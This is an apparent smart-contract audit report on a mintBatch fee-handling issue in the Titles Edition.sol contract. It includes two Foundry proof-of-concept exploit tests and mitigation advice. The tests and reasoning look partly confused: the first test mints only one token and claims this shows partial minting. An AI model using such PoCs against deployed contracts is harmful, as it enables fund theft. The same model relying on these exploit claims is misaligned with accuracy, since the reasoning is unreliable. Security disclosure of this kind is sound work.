# [H-2] Use of `msg.value` inside a loop in `Edition.sol` allows partial minting and unnecessary gas consumption (Incorrect Minting Fees + Gas Wastage + Partial Minting)

## Summary
The `mintBatch` function in the Edition contract allows minting multiple tokens for different works in a single transaction. However, it uses `msg.value` inside the loop to collect mint fees for each token being minted. This is problematic because `msg.value` represents the total amount of Ether sent with the transaction, not the individual amounts for each token.

## Vulnerability Detail
Add the following Proof of Codes to `Edition.t.sol` and run them using `forge test --mt testExploit_MintBatch` and `forge test --mt testExploit_MintBatch_LargeQuantity`

```javascript 
 function testExploit_MintBatch() public {
        uint256[] memory tokenIds = new uint256[](2);
        tokenIds[0] = 1;
        tokenIds[1] = 2;

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1;
        amounts[1] = 1;

        // Mint a new token for token ID 2
        edition.publish(
            address(2),
            10,
            0,
            0,
            new Node[](0),
            Strategy({
                asset: address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE),
                mintFee: 0.02 ether,
                revshareBps: 2500,
                royaltyBps: 250
            }),
            Metadata({label: "Another Work", uri: "ipfs.io/another-work", data: new bytes(0)})
        );

        // Attempt to mint only the first token with sufficient msg.value
        uint256[] memory singleTokenId = new uint256[](1);
        singleTokenId[0] = tokenIds[0];

        uint256[] memory singleAmount = new uint256[](1);
        singleAmount[0] = amounts[0];

        edition.mintBatch{value: 0.0106 ether}(
            address(1), singleTokenId, singleAmount, new bytes(0)
        );

        // Assert that only the first token was minted
        assertEq(edition.totalSupply(1), 1);
        assertEq(edition.totalSupply(2), 0);
    }
```
This test case demonstrates an exploit because it shows that the `mintBatch` function allows partial minting of tokens when the provided `msg.value` is sufficient for a subset of the tokens, even though the original intent was to mint all the specified tokens. This behavior can lead to inconsistencies in token balances and violate the expected functionality of the mintBatch function.

```javascript 
function testExploit_MintBatch_LargeQuantity() public {
    uint256 numTokens = 100;
    uint256[] memory tokenIds = new uint256[](numTokens);
    uint256[] memory amounts = new uint256[](numTokens);

    for (uint256 i = 0; i < numTokens; i++) {
        tokenIds[i] = i + 1;
        amounts[i] = 1;

        // Generate a unique address for each token
        address creator = address(uint160(uint256(keccak256(abi.encodePacked("creator", i)))));

        // Mint a new token for each token ID
        edition.publish(
            creator,
            10,
            0,
            0,
            new Node[](0),
            Strategy({
                asset: address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE),
                mintFee: 0.01 ether,
                revshareBps: 2500,
                royaltyBps: 250
            }),
            Metadata({label: string(abi.encodePacked("Work ", i + 1)), uri: string(abi.encodePacked("ipfs.io/work-", i + 1)), data: new bytes(0)})
        );
    }

    // Attempt to mint a subset of tokens with insufficient msg.value
    uint256 numTokensToMint = 50;
    uint256[] memory subsetTokenIds = new uint256[](numTokensToMint);
    uint256[] memory subsetAmounts = new uint256[](numTokensToMint);

    for (uint256 i = 0; i < numTokensToMint; i++) {
        subsetTokenIds[i] = tokenIds[i];
        subsetAmounts[i] = amounts[i];
    }

    uint256 insufficientValue = 0.4 ether; // Insufficient value for minting 50 tokens
    
    // Expect a revert due to insufficient funds
    vm.expectRevert();
    edition.mintBatch{value: insufficientValue}(address(this), subsetTokenIds, subsetAmounts, new bytes(0));

    // Assert that no tokens were minted due to the revert
    for (uint256 i = 0; i < numTokens; i++) {
        uint256 tokenId = i + 1;
        uint256 expectedSupply = 0;
        assertEq(edition.totalSupply(tokenId), expectedSupply);
    }
}
```
This test case demonstrates an exploit because it shows that the `mintBatch` function continues to process the minting loop until it runs out of funds, even when the provided `msg.value` is insufficient. This behavior leads to unnecessary computation and gas consumption before the transaction ultimately reverts. Malicious users could exploit this vulnerability by repeatedly calling the mintBatch function with a large number of tokens and insufficient `msg.value`, causing gas wastage and potentially disrupting the contract's availability.

## Impact
Due to the use of msg.value inside the loop, the `mintBatch` function allows minting tokens partially when provided with sufficient `msg.value` for a subset of the tokens. This means that users can mint tokens without paying the full required mint fees for all the tokens they are attempting to mint. As a result, the contract may collect incorrect mint fees, potentially leading to a loss of funds for the contract owner.

The incorrect behavior of the `mintBatch` function can lead to inconsistencies in token balances and disrupt the expected functionality of the contract.

Also, The function continues to process the minting loop until it runs out of funds, leading to unnecessary computation and gas consumption. The unnecessary computation and gas consumption before the function reverts can be exploited by malicious users to cause gas wastage and potentially disrupt the contract's availability.

Inside of the `mintBatch()` function, the msg.value is used here: https://github.com/sherlock-audit/2024-04-titles/blob/main/wallflower-contract-v2/src/editions/Edition.sol?plain=1#L311


## Tool used
Foundry
Manual Review

## Recommendation
There are two way to mitigate this:

1. Provide an explicit array of amounts alongside the receivers array, and check that the sum of all amounts matches `msg.value`.

2. The `mintBatch` function should be modified to validate the total mint fees against the provided `msg.value` before proceeding with the minting process. If the `msg.value` is insufficient to cover the total mint fees, the function should revert early to prevent partial minting and unnecessary computation.
